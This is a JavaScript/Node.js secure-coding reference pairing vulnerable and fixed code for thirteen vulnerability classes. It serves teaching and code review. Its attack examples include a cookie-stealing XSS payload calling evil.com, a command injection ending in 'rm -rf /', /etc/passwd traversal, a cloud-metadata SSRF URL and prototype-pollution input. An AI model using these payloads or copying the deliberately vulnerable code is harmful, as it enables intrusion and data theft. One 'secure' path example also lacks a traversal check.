# JavaScript/Node.js Secure Coding Examples

**Purpose:** Real-world vulnerable and secure code patterns for JavaScript/Node.js code review
**Based on:** OWASP ASVS v5, CWE Top 25, Node.js Security Best Practices

---

## Cross-Site Scripting (CWE-79)

### ❌ Vulnerable - innerHTML with User Input

```javascript
// DOM-based XSS
const userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput;

// Attack: <img src=x onerror="alert('XSS')">
// Result: JavaScript executes
```

### ❌ Vulnerable - React dangerouslySetInnerHTML

```javascript
function UserBio({ bio }) {
  // WRONG: renders raw HTML without sanitization
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}

// Attack: bio = "<img src=x onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>"
```

### ✅ Secure - textContent

```javascript
const userInput = document.getElementById('input').value;
document.getElementById('output').textContent = userInput;
// Special characters automatically escaped
```

### ✅ Secure - React with DOMPurify

```javascript
import DOMPurify from 'dompurify';

function UserBio({ bio }) {
  const sanitized = DOMPurify.sanitize(bio);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Better: avoid dangerouslySetInnerHTML entirely
function UserBio({ bio }) {
  return <div>{bio}</div>; // Auto-escaped by React
}
```

### ✅ Secure - Vue.js

```vue
<template>
  <!-- Wrong: -->
  <div v-html="userBio"></div>

  <!-- Correct: -->
  <div>{{ userBio }}</div>
</template>
```

---

## NoSQL Injection (CWE-943)

### ❌ Vulnerable - MongoDB Query Injection

```javascript
const express = require('express');
const User = require('./models/User');

app.post('/login', async (req, res) => {
  // WRONG: allows object injection
  const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
  });

  if (user) {
    res.json({ success: true });
  }
});

// Attack: POST /login
// Body: {"username": {"$ne": null}, "password": {"$ne": null}}
// Result: Bypasses authentication
```

### ✅ Secure - Type Validation

```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Validate types
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await User.findOne({ username, password });

  if (user) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### ✅ Secure - Use $eq Operator

```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Use $eq to prevent operator injection
  const user = await User.findOne({
    username: { $eq: username },
    password: { $eq: password }
  });

  if (user) {
    res.json({ success: true });
  }
});
```

---

## Command Injection (CWE-78)

### ❌ Vulnerable - child_process.exec

```javascript
const { exec } = require('child_process');

app.get('/files', (req, res) => {
  // WRONG: command injection vulnerability
  exec(`ls ${req.query.dir}`, (error, stdout) => {
    res.send(stdout);
  });
});

// Attack: GET /files?dir=.; rm -rf /
// Result: Executes arbitrary commands
```

### ✅ Secure - execFile with Arguments Array

```javascript
const { execFile } = require('child_process');

app.get('/files', (req, res) => {
  // Correct: arguments passed as array
  execFile('ls', [req.query.dir], (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send('Error listing files');
    }
    res.send(stdout);
  });
});
```

### ✅ Secure - Use Node.js APIs Instead

```javascript
const fs = require('fs').promises;
const path = require('path');

app.get('/files', async (req, res) => {
  try {
    const dirPath = path.join('/safe-directory', req.query.dir);
    const files = await fs.readdir(dirPath);
    res.json(files);
  } catch (error) {
    res.status(500).send('Error listing files');
  }
});
```

---

## Path Traversal (CWE-22)

### ❌ Vulnerable - Unsafe Path Construction

```javascript
const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
  // WRONG: allows path traversal
  const file = path.join('/uploads', req.query.file);
  res.sendFile(file);
});

// Attack: GET /download?file=../../../etc/passwd
// Result: Can download any file
```

### ✅ Secure - Path Validation

```javascript
const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
  const baseDir = path.resolve('/uploads');
  const requestedPath = path.resolve(baseDir, req.query.file);

  // Ensure resolved path is within baseDir
  if (!requestedPath.startsWith(baseDir + path.sep)) {
    return res.status(403).send('Forbidden');
  }

  res.sendFile(requestedPath);
});
```

---

## Prototype Pollution (CWE-1321)

### ❌ Vulnerable - Unsafe Object Merge

```javascript
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
  return target;
}

const userInput = JSON.parse(req.body);
merge(config, userInput);

// Attack: {"__proto__": {"isAdmin": true}}
// Result: Pollutes Object.prototype, affects all objects
```

### ❌ Vulnerable - Lodash Merge (Old Versions)

```javascript
const _ = require('lodash');

// Vulnerable in lodash < 4.17.12
_.merge({}, JSON.parse(userInput));
```

### ✅ Secure - Filter Dangerous Keys

```javascript
const BLOCKED_KEYS = ['__proto__', 'constructor', 'prototype'];

function safeMerge(target, source) {
  for (let key in source) {
    if (
      Object.prototype.hasOwnProperty.call(source, key) &&
      !BLOCKED_KEYS.includes(key)
    ) {
      target[key] = source[key];
    }
  }
  return target;
}
```

### ✅ Secure - Use Object.create(null)

```javascript
// Objects created without prototype
const safeConfig = Object.create(null);
Object.assign(safeConfig, userInput);
```

---

## JWT Vulnerabilities (CWE-327)

### ❌ Vulnerable - None Algorithm

```javascript
const jwt = require('jsonwebtoken');

// WRONG: accepts "none" algorithm
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: user.id }, secret);
  res.json({ token });
});

app.get('/protected', (req, res) => {
  // WRONG: no algorithm specified
  const decoded = jwt.verify(req.headers.authorization, secret);
  res.json({ userId: decoded.userId });
});

// Attack: Token with "alg": "none" and no signature
```

### ❌ Vulnerable - Weak Secret

```javascript
const jwt = require('jsonwebtoken');

// WRONG: weak secret
const SECRET = 'secret';
const token = jwt.sign({ userId: 123 }, SECRET);
```

### ✅ Secure - Specify Algorithms

```javascript
const jwt = require('jsonwebtoken');

const SECRET = process.env.JWT_SECRET; // Strong secret from env

app.post('/login', (req, res) => {
  const token = jwt.sign(
    { userId: user.id },
    SECRET,
    {
      algorithm: 'HS256',
      expiresIn: '1h'
    }
  );
  res.json({ token });
});

app.get('/protected', (req, res) => {
  try {
    // Specify allowed algorithms
    const decoded = jwt.verify(
      req.headers.authorization,
      SECRET,
      { algorithms: ['HS256'] }
    );
    res.json({ userId: decoded.userId });
  } catch (error) {
    res.status(401).send('Invalid token');
  }
});
```

---

## SSRF (CWE-918)

### ❌ Vulnerable - Unvalidated URL Fetch

```javascript
const axios = require('axios');

app.get('/fetch', async (req, res) => {
  // WRONG: fetches any URL
  const response = await axios.get(req.query.url);
  res.send(response.data);
});

// Attack: /fetch?url=http://169.254.169.254/latest/meta-data/
// Result: Access to AWS metadata
```

### ✅ Secure - URL Validation

```javascript
const axios = require('axios');
const { URL } = require('url');

const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];
const BLOCKED_IPS = ['127.0.0.1', 'localhost', '169.254.169.254'];

app.get('/fetch', async (req, res) => {
  try {
    const url = new URL(req.query.url);

    // Validate protocol
    if (!['http:', 'https:'].includes(url.protocol)) {
      return res.status(400).send('Invalid protocol');
    }

    // Block internal IPs
    if (BLOCKED_IPS.includes(url.hostname)) {
      return res.status(403).send('Access denied');
    }

    // Whitelist domains
    if (!ALLOWED_HOSTS.includes(url.hostname)) {
      return res.status(403).send('Domain not allowed');
    }

    const response = await axios.get(url.href, {
      timeout: 5000,
      maxRedirects: 0
    });
    res.send(response.data);
  } catch (error) {
    res.status(500).send('Error fetching URL');
  }
});
```

---

## Open Redirect (CWE-601)

### ❌ Vulnerable - Unvalidated Redirect

```javascript
app.get('/redirect', (req, res) => {
  // WRONG: redirects to any URL
  res.redirect(req.query.url);
});

// Attack: /redirect?url=https://evil.com/phishing
// Result: Phishing via trusted domain
```

### ✅ Secure - Domain Whitelist

```javascript
const ALLOWED_DOMAINS = ['example.com', 'app.example.com'];

app.get('/redirect', (req, res) => {
  try {
    const url = new URL(req.query.url);

    if (ALLOWED_DOMAINS.includes(url.hostname)) {
      res.redirect(req.query.url);
    } else {
      res.status(400).send('Invalid redirect URL');
    }
  } catch (error) {
    res.status(400).send('Invalid URL');
  }
});
```

### ✅ Secure - Relative URLs Only

```javascript
app.get('/redirect', (req, res) => {
  const url = req.query.url;

  // Only allow relative URLs (start with /)
  if (url.startsWith('/') && !url.startsWith('//')) {
    res.redirect(url);
  } else {
    res.status(400).send('Invalid redirect');
  }
});
```

---

## Hardcoded Credentials (CWE-798)

### ❌ Vulnerable - Credentials in Code

```javascript
// WRONG: hardcoded secrets
const config = {
  dbPassword: 'SuperSecret123!',
  apiKey: 'sk_live_1234567890',
  jwtSecret: 'my-secret-key'
};

const stripe = require('stripe')('sk_live_1234567890');
```

### ✅ Secure - Environment Variables

```javascript
require('dotenv').config();

const config = {
  dbPassword: process.env.DB_PASSWORD,
  apiKey: process.env.API_KEY,
  jwtSecret: process.env.JWT_SECRET
};

const stripe = require('stripe')(process.env.STRIPE_KEY);

// .env file (in .gitignore):
// DB_PASSWORD=actual_password
// API_KEY=actual_key
// JWT_SECRET=cryptographically_random_string
// STRIPE_KEY=sk_live_actual_key
```

---

## Weak Random (CWE-330)

### ❌ Vulnerable - Math.random()

```javascript
function generateSessionToken() {
  // WRONG: predictable
  return Math.random().toString(36).substring(2, 15);
}

function generateResetToken() {
  // WRONG: not cryptographically secure
  return Math.floor(Math.random() * 1000000).toString();
}
```

### ✅ Secure - crypto Module

```javascript
const crypto = require('crypto');

function generateSessionToken() {
  // Correct: cryptographically secure
  return crypto.randomBytes(32).toString('hex');
}

function generateResetToken() {
  return crypto.randomBytes(32).toString('base64url');
}

function generateApiKey() {
  return crypto.randomBytes(32).toString('hex');
}
```

---

## Missing Authentication (CWE-306)

### ❌ Vulnerable - No Auth Check

```javascript
app.delete('/api/users/:id', async (req, res) => {
  // WRONG: anyone can delete users
  await User.deleteOne({ _id: req.params.id });
  res.send('User deleted');
});
```

### ✅ Secure - Authentication Middleware

```javascript
const jwt = require('jsonwebtoken');

// Authentication middleware
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).send('No token provided');
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).send('Invalid token');
  }
}

// Authorization check
app.delete('/api/users/:id', authenticate, async (req, res) => {
  // Check if user can delete this account
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).send('Forbidden');
  }

  await User.deleteOne({ _id: req.params.id });
  res.send('User deleted');
});
```

---

## CSRF (CWE-352)

### ❌ Vulnerable - No CSRF Protection

```javascript
app.post('/transfer', (req, res) => {
  // WRONG: no CSRF token validation
  performTransfer(req.user.id, req.body.recipient, req.body.amount);
  res.send('Transfer complete');
});

// Attack: Malicious site creates form that posts to this endpoint
```

### ✅ Secure - CSRF Middleware (Express)

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/transfer-form', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF token automatically validated
  performTransfer(req.user.id, req.body.recipient, req.body.amount);
  res.send('Transfer complete');
});

// Frontend includes CSRF token:
// <input type="hidden" name="_csrf" value="<%= csrfToken %>">
```

### ✅ Secure - Double Submit Cookie (React)

```javascript
// Backend
app.post('/transfer', (req, res) => {
  const tokenFromCookie = req.cookies.csrf;
  const tokenFromHeader = req.headers['x-csrf-token'];

  if (!tokenFromCookie || tokenFromCookie !== tokenFromHeader) {
    return res.status(403).send('CSRF token mismatch');
  }

  performTransfer(req.user.id, req.body.recipient, req.body.amount);
  res.send('Transfer complete');
});

// React frontend
function Transfer() {
  const csrfToken = getCookie('csrf');

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch('/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({ recipient, amount })
    });
  };
}
```

---

## SQL Injection (CWE-89)

### ❌ Vulnerable - String Concatenation

```javascript
const mysql = require('mysql');
const connection = mysql.createConnection(config);

app.get('/user', (req, res) => {
  // WRONG: SQL injection
  const query = `SELECT * FROM users WHERE id = ${req.query.id}`;
  connection.query(query, (error, results) => {
    res.json(results);
  });
});

// Attack: /user?id=1 OR 1=1
```

### ✅ Secure - Parameterized Queries

```javascript
const mysql = require('mysql');
const connection = mysql.createConnection(config);

app.get('/user', (req, res) => {
  const query = 'SELECT * FROM users WHERE id = ?';
  connection.query(query, [req.query.id], (error, results) => {
    if (error) return res.status(500).send('Error');
    res.json(results);
  });
});
```

### ✅ Secure - ORM (Sequelize)

```javascript
const { User } = require('./models');

app.get('/user', async (req, res) => {
  try {
    // Sequelize automatically parameterizes
    const user = await User.findByPk(req.query.id);
    res.json(user);
  } catch (error) {
    res.status(500).send('Error');
  }
});
```

---

## Information Exposure (CWE-200)

### ❌ Vulnerable - Stack Traces in Errors

```javascript
app.use((err, req, res, next) => {
  // WRONG: exposes internal details
  res.status(500).json({
    error: err.message,
    stack: err.stack
  });
});
```

### ✅ Secure - Generic Error Messages

```javascript
app.use((err, req, res, next) => {
  // Log full error server-side
  console.error('Error:', err);

  // Return generic message to client
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    // Only in development
    res.status(500).json({ error: err.message });
  }
});
```

---

## RegEx DoS (CWE-1333)

### ❌ Vulnerable - Catastrophic Backtracking

```javascript
// WRONG: vulnerable to ReDoS
const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\.[a-z]+$/;

app.post('/validate-email', (req, res) => {
  if (emailRegex.test(req.body.email)) {
    res.send('Valid');
  }
});

// Attack: "aaaaaaaaaaaaaaaaaaaaaaaaa!"
// Result: Server hangs
```

### ✅ Secure - Safe Regex

```javascript
// Correct: no nested quantifiers
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

app.post('/validate-email', (req, res) => {
  if (emailRegex.test(req.body.email)) {
    res.send('Valid');
  } else {
    res.send('Invalid');
  }
});
```

### ✅ Secure - Use Validator Library

```javascript
const validator = require('validator');

app.post('/validate-email', (req, res) => {
  if (validator.isEmail(req.body.email)) {
    res.send('Valid');
  } else {
    res.send('Invalid');
  }
});
```

---

**Created:** 2026-01-17
**Total Examples:** 13 vulnerability classes
**Coverage:** OWASP Top 10, CWE Top 25, Client + Server side
**Frameworks:** React, Express, Next.js, Vue.js
**Status:** Complete
